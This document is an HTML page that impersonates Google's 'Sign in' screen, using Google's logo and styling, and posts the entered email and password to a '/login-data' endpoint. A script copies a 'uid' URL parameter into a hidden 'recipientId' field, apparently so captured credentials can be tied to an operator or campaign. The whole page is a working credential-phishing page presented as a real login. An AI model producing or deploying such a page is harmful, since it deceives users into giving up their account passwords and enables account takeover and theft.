<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google</title>
    <style>
        body, html { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; height: 100%; box-sizing: border-box; }
        .card { width: 100%; max-width: 400px; }
        .logo { text-align: center; margin-bottom: 24px; }
        .title { font-size: 24px; color: #202124; text-align: center; }
        .subtitle { font-size: 16px; color: #5f6368; text-align: center; margin-top: 8px; margin-bottom: 24px; }
        input { width: 100%; height: 56px; padding: 13px 15px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 16px; }
        button { float: right; padding: 10px 24px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" height="24"></div>
        <h1 class="title">Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form action="/login-data" method="post">
            <input type="text" name="username" placeholder="Email or phone" required autocapitalize="none">
            <input type="password" name="password" placeholder="Enter your password" required>
            <input type="hidden" name="service" value="Google">
            <input type="hidden" id="recipientId" name="recipientId" value="">
            <button type="submit">Next</button>
        </form>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const params = new URLSearchParams(window.location.search);
            const userId = params.get('uid');
            if (userId) document.getElementById('recipientId').value = userId;
        });
    </script>
</body>
</html>
